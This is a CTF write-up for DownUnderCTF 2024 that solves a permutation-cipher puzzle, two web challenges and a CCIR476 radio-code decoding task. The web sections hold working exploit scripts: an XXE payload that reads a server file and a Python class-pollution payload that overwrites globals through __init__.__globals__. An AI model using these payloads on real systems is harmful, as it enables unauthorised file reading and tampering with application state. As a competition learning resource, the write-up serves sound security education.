---
title: DownUnderCTF 2024
draft: false
tags:
  - ctf
---
# Crypto

## Shufflebox

> I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws.

## Solution

The script `shufflebox.py` generates a permutation, `PERM` of the integers 0-16. Then, it uses `random.shuffle(PERM)` to shuffle the permutation. Lastly, it iterates through each line in an input file, grabbing the character at the index specified by the shuffled permutation, and writing it to an output file.

A simplified scenario:

```python
PERM = [0, 1, 2]
random.shuffle(PERM) -> [2, 0, 1]

input = "abc"
output = ""

for c in range(len(input)):
    output += input[PERM[c]]

print(output) -> "cab"
```

We are given the following output:

```
aaaabbbbccccdddd -> ccaccdabdbdbbada
abcdabcdabcdabcd -> bcaadbdcdbcdacab
???????????????? -> owuwspdgrtejiiud
```

We are given 2/3 of the shuffled output, and need to find the third, which is the flag. The first input we were given is grouped into four. Because the order of this, we can identify possible permutations for each group of four. For example, take `aaaa`. In the output, the index of the first `a` could be [2, 6, 13, or 15]. We can generate all possible permutations for each group of four, and then check the second input to find the correct permutation. Once we have the correct permutation, we can use it to find the flag.

A: 2, 6, 13, 15 B: 7, 9, 11, 12 C: 0, 1, 3, 4 D: 5, 8, 10, 14

These are the possible permutations for the first input. We can then check the second input to find the correct permutation. So, let's start with A:

permutation[0]:

- 2: `in2[0] == out2[2]` -> `a == a` Correct!
- 6: `in2[0] == out2[6]` -> `a == d` Incorrect
- 13: `in2[0] == out2[13]` -> `a == c` Incorrect
- 15: `in2[0] == out2[15]` -> `a == b` Incorrect

permutation[1]:

- 6: `in2[1] == out2[6]` -> `b == d` Incorrect
- 13: `in2[1] == out2[13]` -> `b == c` Incorrect
- 15: `in2[1] == out2[15]` -> `b == b` Correct!

permutation[2]:

- 6: `in2[2] == out2[6]` -> `c == d` Incorrect
- 13: `in2[2] == out2[13]` -> `c == c` Correct!

permutation[3]:

- 6: `in2[3] == out2[6]` -> `d == d` Correct!

So, the first four of the permutation is `[2, 15, 13, 6]`. We continue this process for the other three groups of four, and then use the correct permutation to find the flag. We can automate this entire process with the following script:

```python
def solve():
    in1 = 'aaaabbbbccccdddd'
    out1 = 'ccaccdabdbdbbada'
    in2 = 'abcdabcdabcdabcd'
    out2 = 'bcaadbdcdbcdacab'
    
    perms = []
    
    # Break in1 into chunks of four
    # We know it was shuffled in order, so we can generate possible permutations
    # ie: The first four A's have to be mapped to [2, 6, 13, 15], B's to ...
    in1_groups = in1[0:4], in1[4:8], in1[8:12], in1[12:16]
    
    # Find each possible permutation index
    for group in in1_groups:
        for i in range(4):
            perms.append(out1.index(group[i]))
            out1 = out1.replace(group[i], '_', 1)
     
    print(perms)
    # Now we have a list of possible permutations, can break into chunks of four and validate against in2
    perms = [perms[i:i+4] for i in range(0, len(perms), 4)]
    in2_groups = in2[0:4], in2[4:8], in2[8:12], in2[12:16]
    
    final_perm = []
    
    # Check each group of four in in2 against the possible permutations to find the correct one
    for i, group in enumerate(in2_groups):
        for j in range(4):
            for p in perms[i]:
                if out2[p] == group[j]:
                    final_perm.append(p)
    
    print(final_perm)
    
    # ???????????????? -> owuwspdgrtejiiud
    
    print(''.join(['owuwspdgrtejiiud'[p] for p in final_perm]))

perm = solve()
```

# Web

## Zoo Feedback Form

The webpage is a simple feedback form with only one input field. Upon clicking "Submit Feedback", a POST request is sent:

```xml
<?xml version="1.0" encoding="UTF-8"?>
            <root>
                <feedback>a</feedback>
            </root>
```

with a response of:

```
Feedback sent to the Emus: a
```

Testing around, we can determine that the form is unfiltered. For example, sending `<` yields an XML parsing error about `invalid element name`. Thus, this form is vulnerable to XXE (XML External Entity) injection. Specifically, we can use the `<!ENTITY>` directive to read the contents of files on the server (along with other possibilities, but for getting the flag, this is all we need).

```python
import requests

url = 'https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/'

headers = {
    'Content-Type': 'application/xml'

}

payload = """
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
<root>
    <feedback>&xxe;</feedback>
</root>
"""

response = requests.post(url, data=payload, headers=headers)
print(response.text)
```

This script sends a POST request with the payload containing the `<!ENTITY>` directive to read the contents of `flag.txt`. The response contains the flag!

## CO2

> A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

We are given a simple blog website with some basic functionality: the ability to register, the ability to create posts, and the ability to leave feedback. I started by taking a look at the source code, and everything looked good for the most part, until I noticed a comment in `app/routes.py`:

```python
# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
```

"dynamically add fields" sounds pretty interesting. Looking further into the feedback route:

```python
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
```

It uses the `merge` function to merge the data from the request into the `Feedback` object. Let's quickly check the `merge` function:

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

This immediately reminded me of JavaScript's `prototype pollution` vulnerability, but I wasn't sure if this existed in Python. I copied the merge function and googled it, and found a blog posting detailing [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)! Huge shoutout to Abdulrah33m for all the research and teaching me something new! So, we know it's vulnerable, but what is the flag condition?

```python
flag = os.getenv("flag")

@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

My first intuition was set the flag environment variable to true. I created a quick test script utilizing the logic from the blog post:

```python
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def local_solve():
    print(os.getenv("flag"))
    obj = Feedback()
    exploit = {
        "__init__": {
            "__globals__": {
                "os": {
                    "environ": {
                        "flag": "true"
                    }
                }
            }
        }
    }
    merge(exploit, obj)
    print(os.getenv("flag"))

local_solve()
```

And it worked! I was able to get from `None` to `true`. However, when testing this payload on the actual remote server, I was not able to get the flag. After some thinking, I realized that that this change is not persistent. The `get_flag` endpoint checks the value of the global variable `flag`, which is set to `os.getenv("flag")` when the server starts. This means that even if we change the environment variable, the server will still check the original value. So, we need to find a way to change the value of the global variable `flag`. This is actually simpler than setting the environment variable, as we can just set the value of the global variable directly.

```python
import json
import requests

def remote_solve():
    cookies = {
        'session': 'redacted'
    }
    exploit = {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
    url = 'https://web-co2-630afc019691685b.2024.ductf.dev'
    r = requests.post(url+"/save_feedback", cookies=cookies, json=exploit)
    print(r.text)
    r = requests.get(url+"/get_flag", cookies=cookies)
    print(r.text)
    
remote_solve()
```

And we get the flag!

# Misc

## Intercepted Transmission

> Those monsters! They've kidnapped the Quokkas! Who in their right mind would capture those friendly little guys.. We've managed to intercept a CCIR476 transmission from the kidnappers, we think it contains the location of our friends! Can you help us decode it? We managed to decode the first two characters as '##'

We're told that the transmission is CCIR476 encoded. A quick [search](https://en.wikipedia.org/wiki/CCIR_476) tells us that it is a radio communication protocol where each character is represented by a 7-bit code. Four of the bits are `1` and three are `0`, to allow for single bit error correction.

All we need is a mapping of the 7-bit code to the character it represents, which we can find [here](https://web.archive.org/web/20220211215211/http://www.discolodxgroup.cl/documentos/otros/ARRL%202013%20Handbook/ARRL%202013%20Handbook%20Supplemental%20Files/Chapter%2016/ITA2-CODES.pdf).

There are two special control characters, `LTRS` and `FIGS`, which switch between letters and figures respectively, so we need to keep track of what mode we're in.

```python
binary = '101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011'


# 47 A — —
# 72 B ? ?
# 1D C : :
# 53 D 5 $
# 56 E 3 3
# 1B F 4 !
# 35 G 4 &
# 69 H 4 # or motor stop
# 4D I 8 8
# 17 J BELL ´
# 1E K ( (
# 65 L ) )
# 39 M . .
# 59 N , ,
# 71 0 9 9
# 2D P 0 0
# 2E Q 1 1
# 55 R 4 4
# 4B S ' BELL
# 74 T 5 5
# 4E U 7 7
# 3C V = ;
# 27 W 2 2
# 3A X / /
# 2B Y 6 6
# 63 Z + "
# 78 ← CR (Carriage return)
# 6C ≡ LF (Line feed)
# 5A ↓ LTRS (Letter shift)
# 36 ↑ FIGS (Figure shift)
# 5C SP (Space)
# 6A BLK (Blank)

LTRS = {
    '47': 'A',
    '72': 'B',
    '1D': 'C',
    '53': 'D',
    '56': 'E',
    '1B': 'F',
    '35': 'G',
    '69': 'H',
    '4D': 'I',
    '17': 'J',
    '1E': 'K',
    '65': 'L',
    '39': 'M',
    '59': 'N',
    '71': 'O',
    '2D': 'P',
    '2E': 'Q',
    '55': 'R',
    '4B': 'S',
    '74': 'T',
    '4E': 'U',
    '3C': 'V',
    '27': 'W',
    '3A': 'X',
    '2B': 'Y',
    '63': 'Z',
    '78': '\r',
    '6C': '\n',
    '5A': 'LTRS',
    '36': 'FIGS',
    '5C': ' ',
    '6A': '' # blank
}

FIGS = {
    '47': 'A',
    '72': '?',
    '1D': ':',
    '53': '$',
    '56': '3',
    '1B': '!',
    '35': '&',
    '69': '#',
    '4D': '8',
    '17': '´',
    '1E': '(',
    '65': ')',
    '39': '.',
    '59': ',',
    '71': '9',
    '2D': '0',
    '2E': '1',
    '55': '4',
    '4B': '\a', # BELL
    '74': '5',
    '4E': '7',
    '3C': ';',
    '27': '2',
    '3A': '/',
    '2B': '6',
    '63': '"',
    '78': '\r',
    '6C': '\n',
    '5A': 'LTRS',
    '36': 'FIGS',
    '5C': ' ',
    '6A': '' # blank
    
}

current = "LTRS"
flag = ""

# split into chunks of seven
chunks = [binary[i:i+7] for i in range(0, len(binary), 7)]
print(chunks)

for chunk in chunks:
    h = hex(int(chunk, 2))[2:].upper()
    if current == "LTRS":
        char = LTRS.get(h)
        if char == "FIGS":
            current = "FIGS"
        elif char == "LTRS":
            pass
        else:
            flag += char
    else:
        char = FIGS.get(h)
        if char == "FIGS":
            pass
        elif char == "LTRS":
            current = "LTRS"
        else:
            flag += char

print(flag)
```